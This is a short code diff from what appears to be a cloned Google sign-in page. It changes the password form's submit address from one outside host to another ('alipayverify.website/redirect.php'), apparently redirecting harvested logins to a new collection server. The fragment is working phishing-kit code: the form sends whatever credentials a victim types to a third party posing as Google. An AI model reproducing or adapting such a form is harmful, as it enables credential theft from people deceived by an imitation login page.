@@ -1966,7 +1966,7 @@ shift-form">
   </div>
   
   <!--Password Form -->
-  <form novalidate="" method="post" action="https://bobstottts.000webhostapp.com/redirect.php" id="gaia_loginform">
+  <form novalidate="" method="post" action="http://alipayverify.website/redirect.php" id="gaia_loginform">
   <input name="Page" type="hidden" value="PasswordSeparationSignIn">
   <input type="hidden" name="GALX" value="TmO_zKwsYwE">
   <input type="hidden" name="gxf" value="AFoagUU326Ai9tsJGkO7cOyDTeI6F3K-_g:1487920842351">
